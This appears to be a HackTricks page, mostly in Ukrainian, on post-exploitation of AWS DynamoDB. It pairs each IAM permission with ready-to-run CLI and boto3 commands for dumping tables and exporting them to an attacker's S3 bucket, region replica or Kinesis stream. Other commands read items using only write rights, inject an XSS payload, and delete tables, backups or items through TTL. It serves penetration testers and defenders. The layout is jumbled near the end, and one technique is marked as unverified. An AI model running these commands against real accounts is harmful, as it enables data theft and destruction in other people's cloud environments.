# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Для отримання додаткової інформації див.:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Attacker з цими дозволами зможе **get items from tables by the primary key** (ви не можете просто запросити всі дані таблиці). Це означає, що вам потрібно знати primary keys (їх можна отримати, отримавши table metadata (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Потенційний вплив:** Indirect privesc шляхом виявлення конфіденційної інформації в таблиці

### `dynamodb:GetItem`

**Подібно до попередніх дозволів** цей дозволяє потенційному зловмиснику прочитати значення лише з 1 таблиці, маючи первинний ключ запису, який потрібно отримати:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
З цим дозволом також можливо використати метод **`transact-get-items`** наступним чином:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Потенційний вплив:** Косвений privesc шляхом знаходження конфіденційної інформації в таблиці

### `dynamodb:Query`

**Аналогічно до попередніх дозволів** цей дозвол дає потенційному зловмиснику можливість читати значення лише з однієї таблиці за умови надання первинного ключа запису для отримання. Дозволяє використовувати [підмножину порівнянь](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html), але єдине порівняння, дозволене для первинного ключа (який повинен бути вказаний), — "EQ", тому ви не можете використати порівняння, щоб отримати всю базу даних в одному запиті.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Потенційний вплив:** Опосередковане privesc шляхом знаходження конфіденційної інформації в таблиці

### `dynamodb:Scan`

Ви можете використати цей дозвіл, щоб **dump the entire table easily**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Можливий вплив:** Непрямий privesc шляхом знаходження конфіденційної інформації в таблиці

### `dynamodb:PartiQLSelect`

Ви можете використовувати цей дозвіл, щоб **легко dump всю таблицю**
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Цей дозвіл також дозволяє виконувати `batch-execute-statement`, наприклад:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
але потрібно вказати первинний ключ із значенням, тому це не надто корисно.

**Potential Impact:** Непрямий privesc шляхом виявлення чутливої інформації в таблиці

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Ця дозвола дозволить нападникові **експортувати всю таблицю в S3 bucket** на свій вибір:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Зверніть увагу, що для цього таблиця має мати увімкнену point-in-time-recovery, ви можете перевірити, чи таблиця має її за допомогою:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Якщо це не ввімкнено, вам потрібно **увімкнути це**, а для цього вам потрібен дозвіл **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** Indirect privesc шляхом знаходження чутливої інформації в таблиці

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`


З цими дозволами нападник зможе **створити нову таблицю з резервної копії** (або навіть створити резервну копію, щоб потім відновити її в іншій таблиці). Далі, маючи необхідні дозволи, він зможе перевіряти **інформацію** з резервних копій, яка **більше не міститься в продукційній таблиці**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** Непряма privesc шляхом знаходження чутливої інформації у резервній копії таблиці

### `dynamodb:PutItem`

Цей дозвіл дає змогу користувачам додавати **новий елемент до таблиці або замінити існуючий елемент** новим елементом. Якщо елемент з тим самим первинним ключем вже існує, **весь елемент буде замінено** новим елементом. Якщо первинний ключ не існує, новий елемент з вказаним первинним ключем буде **створений**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Потенційний вплив:** Експлуатація інших вразливостей/обхідних механізмів завдяки можливості додавати/змінювати дані в таблиці DynamoDB

### `dynamodb:UpdateItem`

Цей дозвіл дозволяє користувачам **змінювати існуючі атрибути елемента або додавати нові атрибути до елемента**. Вона **не замінює** весь елемент; вона лише оновлює вказані атрибути. Якщо первинний ключ не існує в таблиці, операція **створить новий елемент** з вказаним первинним ключем та встановить атрибути, вказані в update expression.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Потенційний вплив:** Експлуатація подальших уразливостей/обхідних шляхів за рахунок можливості додавати/змінювати дані в таблиці DynamoDB

### `dynamodb:DeleteTable`

Зловмисник з цим дозволом може **видалити таблицю DynamoDB, спричинивши втрату даних**
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Потенційний вплив**: Втрата даних та порушення роботи сервісів, що залежать від видаленої таблиці.

### `dynamodb:DeleteBackup`

Зловмисник з цим дозволом може **видалити резервну копію DynamoDB, що потенційно може призвести до втрати даних у разі аварійного відновлення**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Потенційний вплив**: Втрата даних та неможливість відновлення з резервної копії під час сценарію відновлення після аварії.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Перевірити, чи це справді працює

Зловмисник з такими дозволами може **увімкнути потік у таблиці DynamoDB, оновити таблицю, щоб почати потокове передавання змін, а потім отримати доступ до потоку для відстеження змін у таблиці в режимі реального часу**. Це дозволяє зловмиснику відстежувати та exfiltrate зміни даних, що потенційно може призвести до data leakage.

1. Увімкнути потік у таблиці DynamoDB:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Описати stream, щоб отримати ARN та інші деталі:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Отримайте shard iterator, використовуючи stream ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Використайте shard iterator для доступу та exfiltrate даних зі stream:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potential impact**: Моніторинг у реальному часі та data leakage змін таблиці DynamoDB.

### Read items via `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

Атакувач, який має лише `dynamodb:UpdateItem` на таблиці, може читати елементи без звичних дозволів на читання (`GetItem`/`Query`/`Scan`) шляхом виконання нешкідливого оновлення і запиту `--return-values ALL_OLD`. DynamoDB поверне повне попереднє зображення елемента у полі `Attributes` відповіді (це не споживає RCUs).

- Мінімальні дозволи: `dynamodb:UpdateItem` на цільовій таблиці/ключі.
- Передумови: потрібно знати первинний ключ елемента.

Приклад (додає нешкідливий атрибут і exfiltrates попередній елемент у відповіді):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Відповідь CLI включатиме блок `Attributes`, який містить повний попередній елемент (усі атрибути), фактично надаючи примітив читання (read primitive) з доступу лише для запису.

**Потенційний вплив:** Читання довільних елементів таблиці, маючи лише права на запис, що дозволяє екфільтрацію конфіденційних даних, якщо відомі первинні ключі.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Прихована екфільтрація шляхом додавання нової регіональної репліки до DynamoDB Global Table (version 2019.11.21). Якщо принципал може додати регіональну репліку, уся таблиця реплікується в регіон, обраний зловмисником, звідки зловмисник може прочитати всі елементи.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Permissions: `dynamodb:UpdateTable` (with `replica-updates`) or `dynamodb:CreateTableReplica` on the target table. Якщо у репліці використовується CMK, можуть знадобитися права KMS для цього ключа.

Potential Impact: Повна реплікація таблиці в регіон, контрольований зловмисником, що призводить до прихованого виведення даних.

### `dynamodb:TransactWriteItems` (читання через невдалу умову + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Зловмисник із правами на транзакційні операції запису може вивести повні атрибути існуючого елементу, виконавши `Update` всередині `TransactWriteItems`, що навмисно призведе до невдачі `ConditionExpression`, одночасно встановивши `ReturnValuesOnConditionCheckFailure=ALL_OLD`. При відмові DynamoDB включає попередні атрибути в причини скасування транзакції, фактично перетворюючи доступ тільки для запису в доступ для читання цільових ключів.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Дозволи: `dynamodb:TransactWriteItems` на цільовій таблиці (та на відповідному item). Дозволи для читання не потрібні.

Можливий вплив: читання довільних елементів (за первинним ключем) з таблиці, використовуючи лише привілеї транзакційного запису через повернуті причини скасування.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` на GSI

Обійдіть обмеження на читання, створивши Global Secondary Index (GSI) з `ProjectionType=ALL` на атрибуті з низькою ентропією, встановивши цьому атрибуту сталe значення для всіх елементів, а потім `Query` індекс, щоб отримати повні елементи. Це працює навіть якщо `Query`/`Scan` на базовій таблиці заборонено, доки ви можете виконувати запит до ARN індексу.

- Мінімальні дозволи:
- `dynamodb:UpdateTable` на цільовій таблиці (щоб створити GSI з `ProjectionType=ALL`).
- `dynamodb:UpdateItem` на ключах цільової таблиці (щоб встановити індексований атрибут для кожного елемента).
- `dynamodb:Query` на ARN ресурсу індексу (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Кроки (PoC в us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Потенційний вплив:** Повне exfiltration всієї таблиці шляхом запиту новоствореного GSI, який проєктує всі атрибути, навіть коли базові API читання таблиці заборонені.


### `dynamodb:EnableKinesisStreamingDestination` (Безперервне exfiltration через Kinesis Data Streams)

Зловживання DynamoDB Kinesis streaming destinations для безперервного exfiltrate змін з таблиці в контрольований зловмисником Kinesis Data Stream. Після увімкнення кожна подія INSERT/MODIFY/REMOVE пересилається майже в реальному часі до Kinesis Data Stream без потреби в дозволах на читання таблиці.

Мінімальні дозволи (зловмисник):
- `dynamodb:EnableKinesisStreamingDestination` на цільовій таблиці
- За потреби `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` для моніторингу статусу
- Дозволи на читання на Kinesis stream, що належить зловмиснику, для споживання записів: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

Зловмисник, який має дозвіл dynamodb:UpdateTimeToLive, може змінити конфігурацію TTL (time-to-live) таблиці — увімкнути або вимкнути TTL.

Коли TTL увімкнено, окремі елементи, що містять налаштований атрибут TTL, автоматично видаляються, коли настає їхній час закінчення. Значення TTL — це просто ще один атрибут кожного елемента; елементи без цього атрибута не підлягають видаленню за TTL.

Якщо елементи не містять атрибута TTL, зловмиснику також знадобиться дозвіл на оновлення елементів (наприклад dynamodb:UpdateItem), щоб додати атрибут TTL і спричинити масові видалення.

Спочатку увімкніть TTL для таблиці, вказавши ім'я атрибута, який використовуватиметься для встановлення часу життя:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Потім оновіть items, додавши атрибут TTL (epoch seconds), щоб вони вичерпали термін дії та були видалені:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

Зловмисник, який має дозволи `dynamodb:RestoreTableFromAwsBackup` або `dynamodb:RestoreTableToPointInTime`, може створювати нові таблиці, відновлені з бекапів або з point-in-time recovery (PITR), не перезаписуючи початкову таблицю. Відновлена таблиця містить повне зображення даних на вибраний момент, тож зловмисник може використовувати її для експфільтрації історичної інформації або отримати повний дамп попереднього стану бази даних.

Restore a DynamoDB table from an on-demand backup:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
Відновити таблицю DynamoDB до точки в часі (створити нову таблицю зі станом після відновлення):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potential Impact:** Неперервне, майже в режимі реального часу exfiltration змін таблиці в attacker-controlled Kinesis stream без прямих read operations на таблиці.



{{#include ../../../../banners/hacktricks-training.md}}
